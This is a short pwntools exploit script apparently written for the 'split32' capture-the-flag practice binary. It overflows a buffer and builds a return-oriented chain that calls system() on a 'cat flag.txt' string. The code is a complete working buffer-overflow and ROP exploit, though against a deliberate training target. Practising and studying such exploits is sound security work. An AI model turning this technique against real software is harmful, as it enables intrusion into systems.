from pwn import *

# 0804a030 cat flag.txt
# 080483e0 System 
# 0804860c usefulFunction 
# 0x08048395 : pop ebx ; ret

"""
CALL system("/bin/cat flag.txt") -> then call -> usefulFunction
[System addr]
[exec after System] -> usefulFunction
[System 1 arg]
[usefulFunctionArg]

"""


def exploit():
    p = process("split32")
    # proc.wait_for_debugger(p.pid)

    buf = b""
    buf += b"A"*0x2c
    buf += p32(0x080483e0)  # system
    buf += p32(0x08048395)  # pop ebx ; ret to clear system arg
    buf += p32(0x0804a030)  # Arg of system -> cat flag.txt
    buf += p32(0x0804860c)  # ls
    buf += b"DDDD"
    print("[!] Sending payload....")
    p.sendline(buf)

    p.interactive()
exploit()